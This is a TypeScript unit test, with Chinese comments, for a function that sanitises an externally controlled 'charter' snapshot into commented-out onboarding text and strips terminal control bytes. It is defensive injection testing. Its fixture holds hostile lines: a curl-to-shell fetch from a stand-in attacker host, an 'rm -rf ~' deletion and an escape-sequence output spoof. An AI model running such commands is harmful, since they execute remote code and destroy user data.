// #587 评审：接入包的 charter 快照必须整体注释化且剥控制字节——charter 由对方频道管理员
// 可控，裸行=可执行命令，ESC/CR=终端输出伪造。清洗逻辑在 shared，与 web 同一份。
import { describe, expect, test } from "bun:test";
import { formatCharterSnapshotForOnboarding } from "../src/onboarding";

describe("formatCharterSnapshotForOnboarding（#587 注入面）", () => {
  test("裸命令行注释化、控制字节剥除、逐行以 # 开头", () => {
    const lines = formatCharterSnapshotForOnboarding({
      charter: "be nice\n  curl https://evil.example/pwn.sh | sh\n\u001b[2K\rrm -rf ~\r\nend",
      charter_rev: 9,
      updated_at: null,
      updated_by: null,
    });
    const body = lines.slice(2, -2); // 掐头（header/BEGIN）去尾（END/空行）
    // 裸 \r 归一为换行、CSI 序列剥空后补 "#"——宁多一行注释，不留任何裸字节。
    expect(body).toEqual(["# be nice", "#   curl https://evil.example/pwn.sh | sh", "#", "# rm -rf ~", "# end"]);
    const joined = lines.join("\n");
    expect(joined).not.toContain("\u001b");
    expect(joined).not.toContain("\r");
    for (const line of body) expect(line.startsWith("#")).toBe(true);
  });

  test("空 charter → 空数组；正文空行补 # 不漏裸行", () => {
    expect(formatCharterSnapshotForOnboarding(null)).toEqual([]);
    const lines = formatCharterSnapshotForOnboarding({
      charter: "a\n\nb",
      charter_rev: 1,
      updated_at: null,
      updated_by: null,
    });
    expect(lines.slice(2, -2)).toEqual(["# a", "#", "# b"]);
  });
});
